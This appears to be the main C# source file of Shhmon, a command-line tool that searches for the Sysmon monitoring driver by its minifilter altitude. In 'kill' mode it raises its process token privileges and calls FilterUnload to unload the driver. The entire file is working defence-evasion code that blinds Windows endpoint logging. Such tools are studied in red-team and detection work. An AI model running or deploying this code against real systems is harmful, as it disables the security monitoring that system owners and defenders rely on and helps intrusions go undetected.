using System;
using System.Collections.Generic;
using System.Diagnostics;

namespace Shhmon
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args[0] == "hunt" || args[0] == "kill")
            {
                IntPtr currentProcessToken = new IntPtr();
                uint status;
                bool found = false;
                List<FilterParser.FilterInfo> filterInfo = FilterParser.GetFiltersInformation();
                foreach (var filter in filterInfo)
                {
                    if (filter.Altitude.Equals(385201))
                    {
                        found = true;
                        if (filter.Name.Equals("SysmonDrv"))
                        {
                            Console.WriteLine("[+] Found the Sysmon driver running with default name \"SysmonDrv\"");
                            if (args[0] == "kill")
                            {
                                Console.WriteLine("[+] Trying to kill the driver...");
                                Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.TOKEN_ALL_ACCESS, out currentProcessToken);
                                Tokens.SetTokenPrivilege(ref currentProcessToken);
                                status = Win32.FilterUnload(filter.Name);
                                if (!status.Equals(0))
                                {
                                    Console.WriteLine("[-] Driver unload failed");
                                }
                                else
                                {
                                    Console.WriteLine("[+] SysmonDrv was unloaded :)");
                                }
                            }

                        }
                        else
                        {
                            Console.WriteLine("[+] Found the Sysmon driver at altitude 385201 running with alternate name \"{0}\"", filter.Name);
                            if (args[0] == "kill")
                            {
                                Console.WriteLine("[+] Trying to kill the driver...");
                                //currentProcessToken = new IntPtr();
                                Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.TOKEN_ALL_ACCESS, out currentProcessToken);
                                Tokens.SetTokenPrivilege(ref currentProcessToken);
                                status = Win32.FilterUnload(filter.Name);
                                if (!status.Equals(0))
                                {
                                    Console.WriteLine("[-] Driver unload failed");
                                }
                                else
                                {
                                    Console.WriteLine("[+] {0} was unloaded :)", filter.Name);
                                }
                            }
                        }
                    }
                    else
                    { } //skip
                }
                if (!found)
                {
                    Console.WriteLine("[-] No driver found at altitude 385201");
                }
            }
            else
            {
                Console.WriteLine("[-] Incorrect args");
                Console.WriteLine("[-] Usage: Shhmon.exe <hunt|kill>");
            }
        }
    }
}